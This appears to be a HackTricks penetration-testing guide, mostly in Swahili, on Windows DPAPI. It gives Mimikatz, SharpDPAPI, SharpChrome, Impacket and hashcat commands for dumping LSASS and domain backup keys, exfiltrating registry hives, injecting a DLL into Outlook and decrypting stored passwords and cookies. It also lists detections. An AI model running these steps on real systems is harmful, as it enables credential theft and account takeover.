# DPAPI - Kutoa Passwords

{{#include ../../banners/hacktricks-training.md}}



## DPAPI ni nini

Data Protection API (DPAPI) hutumiwa hasa ndani ya mfumo wa uendeshaji wa Windows kwa ajili ya **symmetric encryption ya asymmetric private keys**, ikitumia secrets za user au system kama chanzo muhimu cha entropy. Mbinu hii hurahisisha encryption kwa developers kwa kuwawezesha ku-encrypt data kwa kutumia key inayotokana na logon secrets za user au, kwa system encryption, secrets za system za domain authentication, hivyo kuondoa ulazima wa developers kusimamia ulinzi wa encryption key wenyewe.

Njia inayotumika zaidi kutumia DPAPI ni kupitia functions za **`CryptProtectData` na `CryptUnprotectData`**, ambazo huruhusu applications ku-encrypt na ku-decrypt data kwa usalama kwa kutumia session ya process ambayo ime-log on kwa sasa. Hii inamaanisha kuwa data iliyotolewa kwa encryption inaweza tu ku-decryptiwa na user au system ileile iliyo-encrypt.

Zaidi ya hayo, functions hizi pia zinakubali **`entropy parameter`**, ambayo pia itatumika wakati wa encryption na decryption; kwa hiyo, ili ku-decrypt kitu kilicho-encryptiwa kwa kutumia parameter hii, lazima utoe entropy value ileile iliyotumika wakati wa encryption.

### Utengenezaji wa users key

DPAPI hutengeneza key ya kipekee (inayoitwa **`pre-key`**) kwa kila user kulingana na credentials zao. Key hii hutokana na password ya user na factors nyingine, na algorithm hutegemea aina ya user lakini mwishowe huwa SHA1. Kwa mfano, kwa domain users, **inategemea NTLM hash ya user**.

Hili ni muhimu hasa kwa sababu ikiwa attacker anaweza kupata password hash ya user, anaweza:

- **Ku-decrypt data yoyote iliyo-encryptiwa kwa kutumia DPAPI** na key ya user huyo bila kuhitaji kuwasiliana na API yoyote
- Kujaribu **ku-crack password** offline kwa kujaribu kutengeneza DPAPI key halali

Zaidi ya hayo, kila mara data fulani inapokuwa encrypted na user kwa kutumia DPAPI, **master key** mpya hutengenezwa. Master key hii ndiyo inayotumika kwa hakika ku-encrypt data. Kila master key hupewa **GUID** (Globally Unique Identifier) inayoitambulisha.

Master keys huhifadhiwa katika directory ya **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`**, ambapo `{SID}` ni Security Identifier ya user huyo. Master key huhifadhiwa ikiwa encrypted na **`pre-key`** ya user na pia na **domain backup key** kwa ajili ya recovery (kwa hiyo key ileile huhifadhiwa ikiwa encrypted mara 2 na pass 2 tofauti).

Kumbuka kuwa **domain key inayotumika ku-encrypt master key iko kwenye domain controllers na haibadiliki kamwe**, hivyo ikiwa attacker ana access kwa domain controller, anaweza kupata domain backup key na ku-decrypt master keys za users wote kwenye domain.<sup>[[2]](#references)</sup>

Encrypted blobs huwa na **GUID ya master key** iliyotumika ku-encrypt data ndani ya headers zake.

> [!TIP]
> DPAPI encrypted blobs huanza na **`01 00 00 00`**

Tafuta master keys:
```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```
Hivi ndivyo rundo la Master Keys za user litakavyoonekana:

![What is DPAPI - Users key generation: Hivi ndivyo rundo la Master Keys za user litakavyoonekana](<../../images/image (1121).png>)

### Uundaji wa key ya Machine/System

Hii ni key inayotumiwa na machine kusimba data. Inategemea **DPAPI_SYSTEM LSA secret**, ambayo ni key maalum inayoweza kufikiwa na user wa SYSTEM pekee. Key hii hutumiwa kusimba data inayohitaji kufikiwa na system yenyewe, kama vile credentials za kiwango cha machine au secrets za mfumo mzima.<sup>[[2]](#references)</sup>

Kumbuka kwamba keys hizi **hazina domain backup**, kwa hiyo zinapatikana locally pekee:

- **Mimikatz** inaweza kuifikia kwa kudump LSA secrets kwa kutumia command: `mimikatz lsadump::secrets`
- Secret imehifadhiwa ndani ya registry, kwa hiyo administrator anaweza **kubadilisha ruhusa za DACL ili kuifikia**. Registry path ni: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Offline extraction kutoka kwa registry hives pia inawezekana. Kwa mfano, ukiwa administrator kwenye target, hifadhi hives na uziexfiltrate:
```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```
Kisha kwenye analysis box yako, pata tena DPAPI_SYSTEM LSA secret kutoka kwenye hives na uitumie kusimbua machine-scope blobs (scheduled task passwords, service credentials, Wi‑Fi profiles, n.k.):
```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```
### Data Iliyolindwa na DPAPI

Miongoni mwa data binafsi inayolindwa na DPAPI ni:

- Windows creds
- Passwords na auto-completion data za Internet Explorer na Google Chrome
- Passwords za E-mail na akaunti za ndani za FTP kwa applications kama Outlook na Windows Mail
- Passwords za shared folders, resources, wireless networks, na Windows Vault, pamoja na encryption keys
- Passwords za remote desktop connections, .NET Passport, na private keys kwa madhumuni mbalimbali ya encryption na authentication
- Network passwords zinazosimamiwa na Credential Manager na data binafsi katika applications zinazotumia CryptProtectData, kama Skype, MSN messenger, na nyinginezo
- Encrypted blobs ndani ya registry
- ...

Data inayolindwa na mfumo inajumuisha:
- Wifi passwords
- Scheduled task passwords
- ...

### Chaguo za kutoa master key

- Ikiwa user ana ruhusa za domain admin, anaweza kufikia **domain backup key** ili decrypt user master keys zote katika domain:
```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```
- Ukiwa na ruhusa za local admin, inawezekana **kufikia memory ya LSASS** ili kutoa DPAPI master keys za watumiaji wote waliounganishwa na key ya SYSTEM.
```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```
- Ikiwa user ana local admin privileges, anaweza kufikia **DPAPI_SYSTEM LSA secret** ili decrypt machine master keys:
```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```
- Ikiwa password au hash ya NTLM ya user inajulikana, unaweza **decrypt master keys za user moja kwa moja**:
```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```
- Ikiwa uko ndani ya session kama mtumiaji, inawezekana kuomba **backup key ya ku-decrypt master keys kwa kutumia RPC** kutoka kwa DC. Ikiwa wewe ni local admin na mtumiaji ameingia, unaweza **kuiba session token yake** kwa hili:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
## Orodhesha Vault
```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```
## Fikia Data Iliyosimbwa kwa DPAPI

### Tafuta data iliyosimbwa kwa DPAPI

**files protected** za users wa kawaida zinapatikana katika:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- Pia angalia kwa kubadilisha `\Roaming\` kuwa `\Local\` katika paths zilizo hapo juu.

Mifano ya enumeration:
```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) inaweza kutafuta DPAPI encrypted blobs kwenye mfumo wa faili, registry na B64 blobs:
```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```
Kumbuka kwamba [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (kutoka repo hiyo hiyo) inaweza kutumika kusimbua data nyeti kama cookies kwa kutumia DPAPI.

#### Mapishi ya haraka ya Chromium/Edge/Electron (SharpChrome)

- Mtumiaji wa sasa, usimbuaji shirikishi wa logins/cookies zilizohifadhiwa (hufanya kazi hata na app-bound cookies za Chrome 127+ kwa sababu ufunguo wa ziada hupatikana kutoka kwa Credential Manager ya mtumiaji wakati wa kuendesha katika muktadha wa mtumiaji):
```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```
- Uchambuzi wa offline unapokuwa na files pekee. Kwanza extract AES state key kutoka kwenye "Local State" ya profile, kisha uitumie ku-decrypt cookie DB:
```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```
- Triage ya Domain-wide/remote unapokuwa na DPAPI domain backup key (PVK) na admin kwenye target host:
```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```
- Ikiwa una DPAPI prekey/credkey ya mtumiaji (kutoka LSASS), unaweza kuruka password cracking na kusimbua moja kwa moja data ya profile:
```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```
Maelezo
- Chrome/Edge builds mpya zaidi zinaweza kuhifadhi cookies fulani kwa kutumia usimbaji wa "App-Bound". Offline decryption ya cookies hizo mahususi haiwezekani bila app-bound key ya ziada; endesha SharpChrome chini ya target user context ili kuipata kiotomatiki. Tazama chapisho la blogu ya usalama ya Chrome lililotajwa hapa chini.<sup>[[5]](#references)</sup>

### Access keys na data

- **Tumia SharpDPAPI** kupata credentials kutoka kwa faili zilizosimbwa kwa DPAPI za session ya sasa:
```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage
```
- **Pata taarifa za credentials** kama vile encrypted data na guidMasterKey.<sup>[[3]](#references)</sup>
```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```
- **Access masterkeys**:

Decrypt masterkey ya user anayeomba **domain backup key** kwa kutumia RPC:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```
Zana ya **SharpDPAPI** pia inaauni arguments hizi za masterkey decryption (angalia jinsi inavyowezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia plaintext password, au `/pvk` kubainisha faili ya DPAPI domain private key...):<sup>[[12]](#references)</sup>
```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```
- **Simbua data kwa kutumia masterkey**:
```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```
Zana ya **SharpDPAPI** pia inatumia arguments hizi kwa usimbuaji wa `credentials|vaults|rdg|keepass|triage|blob|ps` (kumbuka kwamba inawezekana kutumia `/rpc` kupata domain backup key, `/password` kutumia password ya maandishi wazi, `/pvk` kubainisha faili la DPAPI domain private key, `/unprotect` kutumia session ya mtumiaji wa sasa...):<sup>[[12]](#references)</sup>
```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
Note: must use with /pvk:KEY or /password:X
Note: not applicable to 'blob' or 'ps' commands
```
- Kutumia DPAPI prekey/credkey moja kwa moja (hakuna password inayohitajika)

Ikiwa unaweza kudump LSASS, Mimikatz mara nyingi hufichua DPAPI key ya kila logon ambayo inaweza kutumika kudecrypt masterkeys za user bila kujua password yake ya plaintext. Pitisha value hii moja kwa moja kwenye tooling:
```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```
- Decrypt baadhi ya data kwa kutumia **current user session**:
```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```
---

### Decryption ya offline with Impacket dpapi.py

Ikiwa una SID na password ya victim user (au NT hash), unaweza decrypt DPAPI masterkeys na Credential Manager blobs entirely offline ukitumia Impacket’s dpapi.py.<sup>[[10]](#references)[[11]](#references)</sup>

- Tambua artefacts kwenye disk:
- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- Ikiwa file transfer tooling haifanyi kazi vizuri, tumia base64 kwenye host na unakili output:
```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```
- Decrypt masterkey kwa kutumia SID na password/hash ya mtumiaji:
```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```
- Tumia decrypted masterkey ku-decrypt credential blob:
```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```
Mtiririko huu mara nyingi hurejesha domain credentials zilizohifadhiwa na apps zinazotumia Windows Credential Manager, ikiwemo akaunti za kiutawala (k.m. `*_adm`).

---

### Kushughulikia Optional Entropy ("Third-party entropy")

Baadhi ya applications hupitisha thamani ya ziada ya **entropy** kwa `CryptProtectData`. Bila thamani hii blob haiwezi ku-decryptiwa, hata kama masterkey sahihi inajulikana. Kwa hiyo, kupata entropy ni muhimu unapolenga credentials zilizolindwa kwa njia hii (k.m. Microsoft Outlook, baadhi ya VPN clients).

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) ni user-mode DLL inayofanya hooks kwenye DPAPI functions ndani ya target process na kurekodi kwa uwazi optional entropy yoyote inayotolewa. Kuendesha EntropyCapture katika **DLL-injection** mode dhidi ya processes kama `outlook.exe` au `vpnclient.exe` kutatoa file inayohusisha kila entropy buffer na calling process pamoja na blob. Entropy iliyokamatwa inaweza baadaye kutolewa kwa **SharpDPAPI** (`/entropy:`) au **Mimikatz** (`/entropy:<file>`) ili ku-decrypt data.<sup>[[6]](#references)</sup>
```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```
### Cracking masterkeys offline (Hashcat & DPAPISnoop)

Microsoft ilianzisha format ya **context 3** ya masterkey kuanzia Windows 10 v1607 (2016). `hashcat` v6.2.6 (Desemba 2023) iliongeza hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) na **22102** (context 3), na kuwezesha cracking ya passwords za watumiaji moja kwa moja kutoka kwenye masterkey file kwa kutumia GPU. Kwa hivyo, Attackers wanaweza kufanya mashambulizi ya word-list au brute-force bila kuingiliana na target system.<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) hu-automate mchakato:
```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```
Tool inaweza pia kuchanganua Credential na Vault blobs, kuzifungua kwa kutumia keys zilizopasuliwa na kuhamisha passwords za cleartext.<sup>[[8]](#references)</sup>


### Fikia data ya mashine nyingine

Katika **SharpDPAPI na SharpChrome** unaweza kubainisha option ya **`/server:HOST`** ili kufikia data ya mashine ya mbali. Bila shaka, unahitaji kuwa na uwezo wa kufikia mashine hiyo, na katika mfano ufuatao inadhaniwa kuwa **domain backup encryption key inajulikana**:
```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```
## Zana nyingine

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) ni tool inayotomatisha extraction ya users na computers wote kutoka kwenye LDAP directory, pamoja na extraction ya domain controller backup key kupitia RPC. Script kisha itatatua IP address za computers zote na kufanya smbclient kwenye computers zote ili kupata DPAPI blobs zote za users wote na decrypt kila kitu kwa kutumia domain backup key.

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

Kwa kutumia orodha ya computers iliyotolewa kutoka LDAP, unaweza kupata kila sub network hata kama hukuijua hapo awali!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) inaweza kudump secrets zinazolindwa na DPAPI automatically. Toleo la 2.x lilianzisha:<sup>[[9]](#references)</sup>

* Parallel collection ya blobs kutoka kwa mamia ya hosts
* Parsing ya **context 3** masterkeys na automatic Hashcat cracking integration
* Support ya Chrome "App-Bound" encrypted cookies (tazama section inayofuata)
* **`--snapshot`** mode mpya ya kupoll endpoints mara kwa mara na kutofautisha blobs mpya zilizoundwa

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) ni C# parser ya masterkey/credential/vault files inayoweza kutoa formats za Hashcat/JtR na, kwa hiari, kuanzisha cracking automatically. Ina support kamili ya machine na user masterkey formats hadi Windows 11 24H1.<sup>[[8]](#references)</sup>


## Detections za kawaida

- Access kwenye files zilizo katika `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` na directories nyingine zinazohusiana na DPAPI.
- Hasa kutoka kwenye network share kama **C$** au **ADMIN$**.
- Matumizi ya **Mimikatz**, **SharpDPAPI** au tooling inayofanana ili kufikia LSASS memory au kudump masterkeys.
- Event **4662**: *An operation was performed on an object* – inaweza kuhusishwa na access kwenye **`BCKUPKEY`** object.
- Event **4673/4674** wakati process inaomba *SeTrustedCredManAccessPrivilege* (Credential Manager)

---
### Vulnerabilities za 2023-2025 na mabadiliko ya ecosystem

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (November 2023). Attacker mwenye network access angeweza kudanganya domain member ili ichukue malicious DPAPI backup key, na hivyo kuruhusu decryption ya user masterkeys. Ilipatched katika November 2023 cumulative update – administrators wanapaswa kuhakikisha kuwa DCs na workstations zote zimepatchiwa kikamilifu.<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (July 2024) ilibadilisha legacy DPAPI-only protection na kuweka key ya ziada chini ya **Credential Manager** ya user. Offline decryption ya cookies sasa inahitaji DPAPI masterkey pamoja na **GCM-wrapped app-bound key**. SharpChrome v2.3 na DonPAPI 2.x zinaweza kurecover key hiyo ya ziada zinapoendeshwa kwa user context.<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – Custom Entropy Inayotokana na SID

Zscaler Client Connector huhifadhi configuration files kadhaa chini ya `C:\ProgramData\Zscaler` (kwa mfano `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`). Kila file ime-encryptiwa kwa **DPAPI (Machine scope)** lakini vendor hutoa **custom entropy** ambayo *hukokotolewa wakati wa runtime* badala ya kuhifadhiwa kwenye disk.<sup>[[1]](#references)</sup>

Entropy hiyo hujengwa upya kutokana na elements mbili:

1. Secret iliyowekwa ndani ya `ZSACredentialProvider.dll`.
2. **SID** ya Windows account ambayo configuration hiyo ni yake.

Algorithm iliyotekelezwa na DLL ni sawa na:
```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```
Kwa sababu siri imepachikwa kwenye DLL inayoweza kusomwa kutoka kwenye diski, **mshambuliaji yeyote wa ndani aliye na haki za SYSTEM anaweza kuzalisha upya entropy kwa SID yoyote** na kusimbua blobs offline:
```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```
Usimbaji fiche hutoa JSON configuration kamili, ikijumuisha kila **device posture check** na thamani yake inayotarajiwa – taarifa yenye thamani kubwa sana wakati wa kujaribu client-side bypasses.

> KIDOKEZO: artefact nyingine zilizofichwa (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) zinalindwa kwa DPAPI **bila** entropy (`16` zero bytes). Kwa hiyo zinaweza kufichwa moja kwa moja kwa `ProtectedData.Unprotect` mara tu privileges za SYSTEM zinapopatikana.

## Marejeleo

- [1] [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. Security analysis and data recovery in DPAPI](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Reading DPAPI Encrypted Secrets with Mimikatz and C++](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Improving the security of Chrome cookies on Windows](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: Simple Extraction of DPAPI Optional Entropy](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 release notes](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project page](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL abuse, KeePassXC Argon2 cracking, and DPAPI decryption to DC admin](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – Usage and options](https://github.com/GhostPack/SharpDPAPI)

{{#include ../../banners/hacktricks-training.md}}
